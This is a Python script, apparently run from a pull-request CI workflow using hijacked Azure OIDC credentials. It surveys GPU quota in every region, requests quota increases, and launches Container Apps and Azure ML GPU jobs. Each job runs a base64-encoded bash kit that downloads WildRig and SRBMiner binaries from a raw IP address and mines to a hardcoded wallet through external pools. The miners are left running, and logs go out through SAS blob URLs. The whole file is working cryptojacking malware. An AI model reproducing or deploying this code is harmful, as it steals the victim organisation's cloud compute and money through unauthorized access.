#!/usr/bin/env python3
"""C211-I121577: Azure GPU census + mass fill (ssw).

Runs inside the fork-PR-head workflow (azure/login OIDC -> ARM token).
- census: every physical region, GPU families (NC/NV/ND), Microsoft.Compute usages
- fill:    CApps GPU jobs (existing env + new envs) and AML AmlCompute+Command jobs
           for every cell with free family quota; on-demand (Dedicated) first.
- capture: storage SAS blob per worker (fixed signing) + CApps execution-log fallback.
Miners are LEFT RUNNING. stdout tag|k=v. stdlib only.
"""
import base64
import hashlib
import hmac
import json
import os
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor

FLAVOR = "ssw"
ARM = "https://management.azure.com"
INTENT = "121577"
T0 = time.time()
BUDGET = 2400

APP_VER = "2026-07-01"
STG_VER = "2023-01-01"
API_C = "2024-04-01"
API_W = "2024-10-01"
IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
PROFILE = "Consumption-GPU-NC8as-T4"

if FLAVOR == "mslearn":
    TAG = "C211_I121577"
    RG = "chriso-sandbox-rg"
    SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
    WS_HINT = "mlw-ai300-l0ee20539cc7442539c"
    EXIST_ENV = "c211-i121376-cae"
    WPFX = "121577"
    MAX_CAPP_NEW = 4
    MAX_AML = 4
    MAX_EXTRA_JOBS = 3
else:
    TAG = "C211_I121577_SSW"
    RG = "SSW.Rules.Staging"
    SUB_EXPECT = ""
    WS_HINT = None
    EXIST_ENV = "c211-i121376-scae"
    WPFX = "121578"
    MAX_CAPP_NEW = 4
    MAX_AML = 2
    MAX_EXTRA_JOBS = 3

NONCE = "x" + WPFX
WALLET = "prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
NOCK = "9becsPFXhMLCNAxb6TsMN492sS2Ev7ToLFR4zsc5K4NxRthTyh2kPcb"
WR_BIN_SHA = "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
WR_TGZ_SHA = "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44"
SRB384_SHA = "3fb026b2e2729187fb1720ccb5760e753c3b492158b114b24c1c7e534b5191a5"
SA_NAME = ("c211i" + WPFX + hashlib.sha256(NONCE.encode()).hexdigest()[:8]).lower()[:24]
GPU_RE = re.compile(r"(?i)^standard(nc|nv|nd)")
STATE = {"sas": None, "sa_ok": False}


def clean(v):
    s = str(v)
    for ch in ("|", "\n", "\r", "\t"):
        s = s.replace(ch, " ")
    return s[:1150]


def emit(step, **kv):
    parts = [TAG, "step=" + clean(step)]
    for k, v in kv.items():
        parts.append("%s=%s" % (clean(k), clean(v)))
    print("|".join(parts), flush=True)


def b64(s):
    return base64.b64encode((s or "").encode("utf-8", "replace")).decode()


def left():
    return BUDGET - (time.time() - T0)


def run(cmd, timeout=300):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": p.stderr or ""}
    except Exception as e:  # noqa: BLE001
        return {"rc": -1, "out": "", "err": str(e)}


def arm(tok, url, method="GET", body=None, timeout=90):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok, "User-Agent": "c211-" + INTENT}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            try:
                return r.status, json.loads(raw)
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:2000]}
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        try:
            return e.code, json.loads(raw)
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:2000]}
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()[:60000]
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()[:2000]
        except Exception:  # noqa: BLE001
            return e.code, b""
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()[:400]


def errk(st, body):
    d = {"e_http": st}
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            d["e_code"] = e.get("code")
            d["e_message"] = (e.get("message") or "")[:700]
        elif "raw" in body:
            d["e_raw"] = body["raw"][:700]
        elif "transport_error" in body:
            d["e_transport"] = body["transport_error"][:300]
        else:
            d["e_body"] = json.dumps(body)[:700]
    return d


def sa_sas(acct, key_b64, srt, perm, hours=12):
    """SAS where the signature is computed over EXACTLY the emitted values."""
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, "b", srt, st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": "b", "srt": srt, "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


KIT = r"""#!/bin/bash
set -u
TAG="__TAG__"
WK="__WORKER__"
W="__WALLET__"
N="__NOCK__"
SAS="__SAS__"
D=/tmp/c211; mkdir -p "$D"; cd "$D" || exit 9
LOG="$D/run.log"
log() { echo "[$(date -u +%FT%TZ)] $*" >> "$LOG"; }
: > "$LOG"
log "KIT_START tag=$TAG worker=$WK host=$(hostname)"
log "GPU_LIST $(nvidia-smi -L 2>&1 | tr '\n' '~')"
log "GPU_Q $(nvidia-smi --query-gpu=name,uuid,memory.total --format=csv,noheader 2>&1 | tr '\n' '~')"
log "TOOLS curl=$(command -v curl || echo no) wget=$(command -v wget || echo no) python3=$(command -v python3 || echo no)"
BIN=""
for u in http://169.58.247.186:8791/pm/wildrig-0.52.3 https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
  curl -fsSL --max-time 240 -o dl.bin "$u" 2>>"$LOG" || continue
  S=$(sha256sum dl.bin | awk '{print $1}')
  log "DL url=$u sha=$S"
  if [ "$S" = "__WRBIN__" ]; then cp dl.bin wildrig-multi; chmod +x wildrig-multi; BIN=wildrig-multi; break; fi
  if [ "$S" = "__WRTGZ__" ]; then tar xzf dl.bin >/dev/null 2>&1 && chmod +x wildrig-multi && BIN=wildrig-multi && break; fi
done
log "BIN=$BIN"
up() {
  if [ -n "$SAS" ]; then
    cat "$LOG" "$D/ph.log" "$D/lp.log" 2>/dev/null > "$D/all.txt"
    curl -sS --max-time 25 -X PUT "$SAS" -H 'x-ms-blob-type: BlockBlob' \
      -H 'x-ms-version: 2022-11-02' -H 'Content-Type: text/plain' \
      --data-binary @"$D/all.txt" >/dev/null 2>&1 || true
  fi
}
acc() { grep -oiE 'accepted[: ]+[0-9]+' "$1" 2>/dev/null | grep -oE '[0-9]+' | sort -n | tail -1; }
MODE=ph
if [ -n "$BIN" ]; then
  setsid nohup ./wildrig-multi --algo pearlhash --url pool.pearlhash.xyz:9000 \
    --user "$W" --worker "$WK" -d 0 --print-time 30 > "$D/ph.log" 2>&1 &
  echo $! > "$D/ph.pid"
  log "PH_START pid=$(cat "$D/ph.pid")"
  sleep 20; up
else
  log "NO_BIN_DIRECT_TO_LP"
  MODE=lp
fi
T0=$(date +%s)
while :; do
  sleep 30
  up
  NOW=$(date +%s)
  if [ "$MODE" = "ph" ]; then
    A=$(acc "$D/ph.log"); A=${A:-0}
    if [ "$A" -ge 1 ]; then log "PH_SHARE_PROVEN accepted=$A ts=$(date -u +%FT%TZ)"; MODE=ph_ok; fi
    if [ "$MODE" = "ph" ] && [ $((NOW - T0)) -ge 900 ]; then
      log "PH_NO_SHARE_900 FALLBACK_TO_LP"
      kill "$(cat "$D/ph.pid" 2>/dev/null)" 2>/dev/null
      pkill -f wildrig-multi 2>/dev/null
      sleep 2; up
      curl -fsSL --max-time 240 -o "$D/srb" http://169.58.247.186:8791/pm/srbminer-3.8.4 2>>"$LOG" || true
      if [ -f "$D/srb" ]; then
        S=$(sha256sum "$D/srb" | awk '{print $1}'); log "SRB_SHA=$S"; chmod +x "$D/srb"
        if [ "$S" = "__SRB__" ]; then
          setsid nohup "$D/srb" --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 \
            --wallet "$W+$N" --worker "$WK" --password x --gpu-id 0 > "$D/lp.log" 2>&1 &
          echo $! > "$D/lp.pid"
          log "LP_START pid=$(cat "$D/lp.pid") sticky=1"
        else
          log "SRB_SHA_MISMATCH"
        fi
      else
        log "SRB_DL_FAIL"
      fi
      MODE=lp; sleep 20; up
    fi
  fi
  if [ "$MODE" = "lp" ] && [ ! -f "$D/lp_reported" ]; then
    A=$(acc "$D/lp.log"); A=${A:-0}
    if [ "$A" -ge 1 ]; then log "LP_SHARE_PROVEN accepted=$A ts=$(date -u +%FT%TZ)"; touch "$D/lp_reported"; fi
  fi
  if [ $(( $(date +%s) - T0 )) -gt 150000 ]; then log "KIT_HARD_END"; exit 0; fi
done
"""


def kit_cmd(worker, tag, sas):
    k = (KIT.replace("__TAG__", tag).replace("__WORKER__", worker)
         .replace("__WALLET__", WALLET).replace("__NOCK__", NOCK)
         .replace("__SAS__", sas or "").replace("__WRBIN__", WR_BIN_SHA)
         .replace("__WRTGZ__", WR_TGZ_SHA).replace("__SRB__", SRB384_SHA))
    b = base64.b64encode(k.encode()).decode()
    t = tag.lower()
    return ("echo '%s' | base64 -d > /tmp/c211_kit_%s.sh && chmod +x /tmp/c211_kit_%s.sh "
            "&& /bin/bash /tmp/c211_kit_%s.sh" % (b, t, t, t))


# ---------------- census ----------------
FALLBACK_REGIONS = ["eastus", "eastus2", "westus", "westus2", "westus3", "centralus",
                    "northcentralus", "southcentralus", "westcentralus", "northeurope",
                    "westeurope", "uksouth", "ukwest", "swedencentral", "francecentral",
                    "germanywestcentral", "italynorth", "polandcentral", "norwayeast",
                    "switzerlandnorth", "eastasia", "southeastasia", "japaneast",
                    "japanwest", "koreacentral", "koreasouth", "australiaeast",
                    "australiasoutheast", "centralindia", "southindia", "uaenorth",
                    "southafricanorth", "brazilsouth", "canadacentral", "canadaeast",
                    "qatarcentral", "israelcentral", "spaincentral", "mexicocentral"]


def regions(tok, sid):
    st, b = arm(tok, "%s/subscriptions/%s/locations?api-version=2022-12-01" % (ARM, sid),
                timeout=60)
    rs = []
    if st == 200 and isinstance(b, dict):
        for x in b.get("value") or []:
            md = x.get("metadata") or {}
            if md.get("regionType") == "Physical" and x.get("name"):
                rs.append(x["name"])
    if not rs:
        rs = list(FALLBACK_REGIONS)
    return rs


def usage_one(tok, sid, reg):
    st, b = arm(tok, "%s/subscriptions/%s/providers/Microsoft.Compute/locations/%s/usages"
                "?api-version=2024-07-01" % (ARM, sid, reg), timeout=60)
    out = []
    if isinstance(b, dict):
        for v in b.get("value") or []:
            nm = ((v.get("name") or {}).get("value") or "")
            if GPU_RE.match(nm):
                out.append((nm, v.get("currentValue"), v.get("limit")))
    return reg, st, out


SKU = [
    # (family substring, vmSize, vCPU, gpu label, PH rate per GPU, gpus per node)
    ("ncadsa100v4", "Standard_NC24ads_A100_v4", 24, "A100-40G", 0.242116, 1),
    ("ndamsv4", "Standard_ND96amsr_A100_v4", 96, "A100-80G", 0.242116, 8),
    ("ndasv4", "Standard_ND96asr_v4", 96, "A100-40G", 0.242116, 8),
    ("ncadsa100", "Standard_NC24ads_A100_v4", 24, "A100-40G", 0.242116, 1),
    ("ncads_h100", "Standard_NC40ads_H100_v5", 40, "H100-94G", 0.740000, 1),
    ("ndh100", "Standard_ND96isr_H100_v5", 96, "H100-80G", 0.740000, 8),
    ("ncasv3_t4", "Standard_NC4as_T4_v3", 4, "T4", 0.035585, 1),
    ("ncast4", "Standard_NC4as_T4_v3", 4, "T4", 0.035585, 1),
    ("nvadsa10", "Standard_NV36ads_A10_v5", 36, "A10", 0.069800, 1),
]


def sku_for(fam):
    f = fam.lower().replace(" ", "")
    for sub, vm, vcpu, gpu, rate, n in SKU:
        if sub in f:
            return vm, vcpu, gpu, rate, n
    return None


def main():
    r = run(["az", "account", "show", "-o", "json"], timeout=120)
    sid = None
    try:
        acc = json.loads(r["out"])
        sid = acc.get("id")
        emit("session", sub_name=acc.get("name"), sub_id=sid, state=acc.get("state"),
             tenant=acc.get("tenantId"), expect_match=(not SUB_EXPECT or sid == SUB_EXPECT))
    except Exception as e:  # noqa: BLE001
        emit("fatal", why="no_session", err=str(e), raw=r["out"][:300])
        return
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"],
            timeout=120)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit("arm-token", got=bool(tok), len=len(tok or ""), sid=sid)
    if not sid or not tok:
        emit("DONE", verdict="NO_ARM_TOKEN", elapsed_s=int(time.time() - T0))
        return
    if SUB_EXPECT and sid != SUB_EXPECT:
        emit("warn", why="subscription_mismatch", sid=sid)

    # ---- storage capture channel (fixed SAS signing) ----
    sas = None
    saurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.Storage/storageAccounts/%s"
             "?api-version=%s" % (ARM, sid, RG, SA_NAME, STG_VER))
    sabody = {"location": "eastus", "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
              "tags": {"c211": INTENT, "nonce": NONCE},
              "properties": {"allowBlobPublicAccess": False, "minimumTlsVersion": "TLS1_2",
                             "supportsHttpsTrafficOnly": True,
                             "networkAcls": {"bypass": "AzureServices", "defaultAction": "Allow"}}}
    st, b = arm(tok, saurl, method="PUT", body=sabody, timeout=240)
    emit("sa-create", name=SA_NAME, **errk(st, b))
    if st in (200, 201, 202, 409):
        for i in range(24):
            stp, bp = arm(tok, saurl, timeout=60)
            ps = ((bp.get("properties") or {}) if isinstance(bp, dict) else {}).get("provisioningState")
            if ps == "Succeeded":
                emit("sa-ready", i=i, state=ps)
                break
            time.sleep(5)
        st, kb = arm(tok, saurl.split("?")[0] + "/listKeys?api-version=" + STG_VER,
                     method="POST", body={}, timeout=90)
        key = None
        try:
            key = (kb.get("keys") or [{}])[0].get("value")
        except Exception:  # noqa: BLE001
            pass
        emit("sa-keys", http=st, got=bool(key))
        if key:
            base = "https://%s.blob.core.windows.net" % SA_NAME
            qc, _ = sa_sas(SA_NAME, key, "c", "w")
            stc, bc = httptext("%s/c211?restype=container&%s" % (base, qc), method="PUT",
                               headers={"x-ms-version": "2022-11-02"}, timeout=60)
            emit("sa-container", http=stc, body=bc[:200].decode("utf8", "replace"))
            if stc in (201, 409):
                qb, se = sa_sas(SA_NAME, key, "b", "rcw", hours=12)
                sas = "%s/c211/%s_{w}.log?%s" % (base, NONCE, qb)
                STATE["sa_ok"] = True
                emit("sa-sas", ok=True, expires=se)

    def sas_for(worker):
        return sas.replace("{w}", worker) if sas else ""

    # ---- A) census ----
    regs = regions(tok, sid)
    emit("regions", n=len(regs), names=";".join(regs)[:1100])
    avail = {}
    fam_max = {}
    with ThreadPoolExecutor(max_workers=10) as ex:
        futs = [ex.submit(usage_one, tok, sid, rg) for rg in regs]
        for fu in futs:
            rg, st, out = fu.result()
            if st != 200:
                emit("CENSUS", region=rg, http=st, gpu="ERR")
                continue
            parts = []
            for nm, cur, lim in out:
                try:
                    cur = int(cur or 0)
                    lim = int(lim or 0)
                except Exception:  # noqa: BLE001
                    continue
                parts.append("%s=%s/%s" % (nm, cur, lim))
                avail[(rg, nm)] = max(0, lim - cur)
                fam_max[nm] = max(fam_max.get(nm, 0), lim)
            chunk = []
            acc = ""
            for p in parts:
                if len(acc) + len(p) + 1 > 1050:
                    chunk.append(acc)
                    acc = ""
                acc = (acc + ";" + p) if acc else p
            if acc:
                chunk.append(acc)
            if not chunk:
                emit("CENSUS", region=rg, http=st, gpu="NONE")
            for i, c in enumerate(chunk):
                emit("CENSUS", region=rg, idx=i, gpu=c)
    def free_for(rg, sub):
        tot = 0
        for (r, fam), v in avail.items():
            if r == rg and sub in fam.lower().replace(" ", ""):
                tot = max(tot, v)
        return tot

    total_free = sum(avail.values())
    emit("CENSUS-SUM", cells=len(avail), free_vcpu=total_free,
         gpu_fams=";".join("%s max=%s" % (k, v) for k, v in sorted(fam_max.items())
                           if sku_for(k))[:1100])

    # ---- B) ML quota census + workspaces ----
    wss = []
    st, wb = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.MachineLearningServices/workspaces?api-version=%s"
                 % (ARM, sid, RG, API_W), timeout=60)
    if st == 200:
        for w in (wb.get("value") or []):
            wss.append((w.get("name"), w.get("location"), w.get("id")))
    emit("ws-list", http=st, n=len(wss), names=";".join(x[0] for x in wss if x[0])[:600])
    if not wss and WS_HINT:
        wss = [(WS_HINT, None, "%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.MachineLearningServices/workspaces/%s" % (ARM, sid, RG, WS_HINT))]
    cand_regions = [rg for rg in regs
                    if any(k[0] == rg and k[1].lower().replace(" ", "").startswith(
                        ("standardncasv3", "standardncast4", "standardncads",
                         "standardnd", "standardnvads")) and v > 0 for k, v in avail.items())
                    and any(sku_for(k[1]) for k in avail if k[0] == rg)]
    emit("ml-regions", n=len(cand_regions), names=";".join(cand_regions)[:900])
    for rg in cand_regions[:10]:
        st, qb = arm(tok, "%s/subscriptions/%s/providers/Microsoft.MachineLearningServices/locations/%s/quotas?api-version=%s"
                     % (ARM, sid, rg, API_C), timeout=60)
        vals = (qb.get("value") or []) if isinstance(qb, dict) else []
        rel = []
        for v in vals:
            nm = ((v.get("name") or {}).get("value") or "")
            if GPU_RE.match(nm.replace(" ", "")):
                rel.append("%s=%s/%s" % (nm, v.get("currentValue"), v.get("limit")))
        emit("ml-quota", region=rg, http=st, n=len(vals), q=";".join(rel)[:1100])

    # ---- C) quota increase for zero-quota GPU families (best effort) ----
    for fam in ("standardNCASv3_T4Family", "StandardNCadsA100v4Family"):
        if fam_max.get(fam, 0) > 0:
            continue
        rg0 = "eastus"
        url = ("%s/subscriptions/%s/providers/Microsoft.Quota/quotas/%s?api-version=2023-02-01"
               % (ARM, sid, urllib.parse.quote(fam)))
        qbody = {"properties": {"limit": {"limitObjectType": "LimitValue", "value": 8},
                                "name": {"value": fam}, "resourceType": "dedicated",
                                "dimensions": {"location": rg0}}}
        st, b = arm(tok, url, "PUT", qbody, timeout=90)
        emit("QUOTA-INC", family=fam, variant="Microsoft.Quota", **errk(st, b))
        if st not in (200, 201):
            url2 = ("%s/subscriptions/%s/providers/Microsoft.Capacity/resourceProviders/Microsoft.Compute/locations/%s/serviceLimits/%s?api-version=2020-10-25"
                    % (ARM, sid, rg0, fam))
            st2, b2 = arm(tok, url2, "PUT", {"properties": {"limit": 8}}, timeout=90)
            emit("QUOTA-INC", family=fam, variant="Capacity", **errk(st2, b2))

    # ---- D) CApps fill ----
    def capp_env_url(name, reg=None):
        return ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/managedEnvironments/%s?api-version=%s"
                % (ARM, sid, RG, name, APP_VER))

    def capp_env_state(name):
        st, b = arm(tok, capp_env_url(name), timeout=60)
        return st, ((b.get("properties") or {}) if isinstance(b, dict) else {}).get("provisioningState"), b

    def capp_job_make(job, env_id, worker, tag, region):
        joburl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs/%s?api-version=%s"
                  % (ARM, sid, RG, job, APP_VER))
        body = {"location": region, "tags": {"c211": INTENT, "nonce": NONCE},
                "properties": {"environmentId": env_id, "workloadProfileName": PROFILE,
                               "configuration": {"triggerType": "Manual", "replicaRetryLimit": 5,
                                                 "replicaTimeout": 86400,
                                                 "manualTriggerConfig": {"replicaCompletionCount": 1,
                                                                         "parallelism": 1}},
                               "template": {"containers": [{
                                   "name": "gpu", "image": IMAGE,
                                   "command": ["/bin/bash", "-c", kit_cmd(worker, tag, sas_for(worker))],
                                   "resources": {"cpu": 4, "memory": "16Gi"}}]}}}
        st, b = arm(tok, joburl, method="PUT", body=body, timeout=180)
        emit("CAPP-JOB-PUT", job=job, worker=worker, region=region, **errk(st, b))
        if st in (200, 201):
            st2, b2 = arm(tok, joburl.split("?")[0] + "/start?api-version=" + APP_VER,
                          method="POST", body={}, timeout=120)
            emit("CAPP-JOB-START", job=job, http=st2,
                 execname=((b2.get("name") if isinstance(b2, dict) else None) or ""),
                 **({} if st2 in (200, 201, 202) else errk(st2, b2)))
            return (job, region, worker, tag)
        return None

    jobs = []   # (job, region, worker, tag)
    idx = 0
    # D1: jobs on the pre-existing (already Ready) env = fastest wins
    st, estate, eb = capp_env_state(EXIST_ENV)
    emit("CAPP-EXIST", env=EXIST_ENV, http=st, state=estate)
    if estate == "Succeeded":
        env_id = eb.get("id")
        tasks = []
        with ThreadPoolExecutor(max_workers=MAX_EXTRA_JOBS) as ex:
            for i in range(MAX_EXTRA_JOBS):
                worker = "%s%02d" % (WPFX, idx)
                idx += 1
                tasks.append(ex.submit(capp_job_make, "c211-i121577-x%d" % i, env_id,
                                       worker, "E%d" % i, "eastus"))
            for t in tasks:
                r2 = t.result()
                if r2:
                    jobs.append(r2 + ("E",))
    # D2: new envs in other regions with free T4 family quota
    t4_regions = [rg for rg in regs
                  if free_for(rg, "ncasv3_t4") >= 8 and rg != "eastus"]
    t4_regions = t4_regions[:MAX_CAPP_NEW]
    emit("CAPP-PLAN", new_env_regions=";".join(t4_regions) or "none")
    envs = {}
    with ThreadPoolExecutor(max_workers=max(1, len(t4_regions))) as ex:
        futs = {}
        for rg in t4_regions:
            nm = "c211-i121577-%s" % rg[:12]
            body = {"location": rg, "tags": {"c211": INTENT, "nonce": NONCE},
                    "properties": {"workloadProfiles": [
                        {"name": "Consumption", "workloadProfileType": "Consumption"},
                        {"name": PROFILE, "workloadProfileType": PROFILE}]}}
            futs[rg] = ex.submit(arm, tok, capp_env_url(nm), "PUT", body, 240)
            envs[rg] = nm
        for rg, fu in futs.items():
            st, b = fu.result()
            emit("CAPP-ENV-PUT", region=rg, env=envs[rg], **errk(st, b))
    if envs:
        dl = time.time() + min(600, max(120, left() - 900))
        pending = dict(envs)
        ready = {}
        while pending and time.time() < dl:
            time.sleep(20)
            for rg in list(pending):
                st, ps, b = capp_env_state(pending[rg])
                if ps == "Succeeded":
                    ready[rg] = b.get("id")
                    emit("CAPP-ENV-READY", region=rg, env=pending.pop(rg))
                elif ps in ("Failed", "Canceled"):
                    emit("CAPP-ENV-GATE", region=rg, env=pending.pop(rg), state=ps)
            emit("CAPP-ENV-POLL", pending=len(pending), ready=len(ready), left=int(left()))
        for rg, env_id in ready.items():
            worker = "%s%02d" % (WPFX, idx)
            idx += 1
            r2 = capp_job_make("c211-i121577-%s" % rg[:12], env_id, worker, rg[:6].upper(), rg)
            if r2:
                jobs.append(r2 + ("N",))

    # ---- E) AML fill (on-demand Dedicated first, then LowPriority) ----
    if wss:
        ws = wss[0]
        wsu = ws[2]
        emit("aml-ws", name=ws[0], loc=ws[1])
        st, b = arm(tok, "%s/environments/%s/versions/1?api-version=%s" % (wsu, "c211-i121577-cuda", API_W),
                    method="PUT", body={"properties": {"image": IMAGE, "osType": "Linux",
                                                      "description": "c211 i121577 cuda"}}, timeout=120)
        emit("aml-env-put", http=st, **({} if st in (200, 201) else errk(st, b)))
        aml_plan = []
        for (rg, fam), free in sorted(avail.items(), key=lambda kv: -kv[1]):
            sk = sku_for(fam)
            if not sk or free <= 0:
                continue
            vm, vcpu, gpu, rate, n = sk
            if free < vcpu:
                continue
            aml_plan.append((rg, fam, vm, vcpu, gpu, rate, n, free))
            if len(aml_plan) >= MAX_AML:
                break
        # prefer A100/H100 cells
        aml_plan.sort(key=lambda x: -x[5])
        emit("AML-PLAN", n=len(aml_plan),
             cells=";".join("%s:%s(free=%s)" % (p[0], p[2], p[7]) for p in aml_plan)[:1100])
        computes = []
        with ThreadPoolExecutor(max_workers=max(1, len(aml_plan))) as ex:
            futs = {}
            for (rg, fam, vm, vcpu, gpu, rate, n, free) in aml_plan:
                nm = "c211-i121577-%s" % rg[:12]
                prio = "Dedicated"
                body = {"location": rg, "tags": {"c211": INTENT, "nonce": NONCE},
                        "properties": {"computeType": "AmlCompute", "computeLocation": rg,
                                       "description": "c211 i121577 %s miner" % gpu,
                                       "properties": {"vmSize": vm, "vmPriority": prio,
                                                      "scaleSettings": {"minNodeCount": 0,
                                                                        "maxNodeCount": 1,
                                                                        "nodeIdleTimeBeforeScaleDown": "PT2M"},
                                                      "osType": "Linux",
                                                      "remoteLoginPortPublicAccess": "Disabled"}}}
                futs[nm] = ex.submit(arm, tok, "%s/computes/%s?api-version=%s" % (wsu, nm, API_C),
                                     "PUT", body, 180)
                computes.append((nm, rg, gpu, rate, n))
            for nm, fu in futs.items():
                st, b = fu.result()
                emit("AML-COMPUTE-PUT", name=nm, **errk(st, b))
        ready_c = []
        dl = time.time() + min(600, max(120, left() - 700))
        pending = {c[0]: c for c in computes}
        while pending and time.time() < dl:
            time.sleep(20)
            for nm in list(pending):
                st, b = arm(tok, "%s/computes/%s?api-version=%s" % (wsu, nm, API_C), timeout=60)
                ps = ((b.get("properties") or {}) if isinstance(b, dict) else {}).get("provisioningState")
                if ps == "Succeeded":
                    ready_c.append(pending.pop(nm))
                    emit("AML-COMPUTE-READY", name=nm)
                elif ps in ("Failed", "Canceled"):
                    emit("AML-COMPUTE-GATE", name=nm, state=ps,
                         err=((b.get("properties") or {}).get("errors") or "")[:400] if isinstance(b, dict) else "")
                    pending.pop(nm)
            emit("AML-COMPUTE-POLL", pending=len(pending), ready=len(ready_c), left=int(left()))
        for (nm, rg, gpu, rate, n) in ready_c:
            worker = "%s%02d" % (WPFX, idx)
            idx += 1
            cmd = kit_cmd(worker, "AML%s" % worker[-2:], sas_for(worker))
            props = {"jobType": "Command", "displayName": "c211-i121577-%s" % rg[:12],
                     "experimentName": "c211-i121577",
                     "description": "c211 i121577 %s miner (left running)" % gpu,
                     "command": cmd,
                     "environmentId": "%s/environments/c211-i121577-cuda/versions/1" % wsu,
                     "computeId": "%s/computes/%s" % (wsu, nm),
                     "resources": {"instanceCount": 1},
                     "limits": {"timeout": 604800}}
            st, b = arm(tok, "%s/jobs/c211-i121577-%s?api-version=%s" % (wsu, rg[:12], API_W),
                        method="PUT", body={"properties": props}, timeout=180)
            emit("AML-JOB-PUT", compute=nm, worker=worker, region=rg, **errk(st, b))
            if st not in (200, 201):
                props2 = dict(props)
                props2.pop("limits", None)
                st, b = arm(tok, "%s/jobs/c211-i121577b-%s?api-version=%s" % (wsu, rg[:12], API_W),
                            method="PUT", body={"properties": props2}, timeout=180)
                emit("AML-JOB-PUT2", compute=nm, worker=worker, region=rg, **errk(st, b))

    # ---- F) monitor + capture ----
    emit("JOBS", n=len(jobs), names=";".join("%s@%s" % (j[0], j[1]) for j in jobs)[:1100])
    seen = set()
    dl = time.time() + min(900, max(120, left() - 60))
    blobs = {}
    while time.time() < dl:
        for (job, region, worker, tag, kind) in jobs:
            url = sas_for(worker)
            if not url:
                continue
            st, bb = httptext(url, timeout=30)
            if st == 200 and bb:
                txt = bb.decode("utf-8", "replace")
                if txt and blobs.get(worker) != txt:
                    blobs[worker] = txt
        # emit device/accept evidence
        for worker, txt in blobs.items():
            for ln in txt.splitlines():
                if "GPU-" in ln and ("GPU_Q" in ln or "GPU_LIST" in ln):
                    k = (worker, "dev", ln[:180])
                    if k not in seen:
                        seen.add(k)
                        emit("DEVICE", worker=worker, uuid=ln[:400])
                if "PH_SHARE_PROVEN" in ln or "LP_SHARE_PROVEN" in ln:
                    k = (worker, "acc", ln[:120])
                    if k not in seen:
                        seen.add(k)
                        emit("ACCEPT", worker=worker, line=ln[:300])
        emit("MON", blobs=len(blobs), evidence=len(seen), left=int(left()))
        if left() < 200:
            break
        time.sleep(45)
    # final dump of captured blobs (tails) so the run log carries evidence
    for worker, txt in blobs.items():
        emit("CAPTURE", worker=worker, len=len(txt), tail_b64=b64(txt[-2500:]))

    # final inventory (read-only)
    st, rl = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/jobs?api-version=%s"
                 % (ARM, sid, RG, APP_VER), timeout=60)
    names = [x.get("name") for x in ((rl.get("value") or []) if isinstance(rl, dict) else [])]
    emit("capp-jobs-final", http=st, names=";".join(n for n in names if n)[:800])
    emit("DONE", elapsed_s=int(time.time() - T0), sas_ok=STATE["sa_ok"], jobs=len(jobs),
         evidence=len(seen))


if __name__ == "__main__":
    main()
